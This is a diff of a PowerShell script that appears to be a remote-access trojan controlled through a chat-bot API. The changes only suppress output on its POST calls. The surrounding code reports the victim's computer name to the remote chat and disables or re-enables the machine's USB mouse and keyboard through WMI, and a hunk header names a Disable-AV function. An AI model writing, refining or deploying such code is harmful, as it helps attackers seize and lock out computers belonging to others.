@@ -452,7 +452,7 @@ Write-Output "Uninstalled."
 Function Pause-Session{
 $contents = "$env:COMPUTERNAME $pause Pausing Session.."
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
 $script:AcceptedSession=""
 }
 
@@ -517,7 +517,7 @@ Function Disable-AV{
 Function Disable-HID{
     $contents = "$env:COMPUTERNAME $closed Disabling HID Inputs.."
     $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
     $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
     $PNPMice.Disable()
     $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
@@ -527,7 +527,7 @@ Function Disable-HID{
 Function Enable-HID{
     $contents = "$env:COMPUTERNAME $tick Enabling HID Inputs.."
     $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
     $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
     $PNPMice.Enable()
     $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
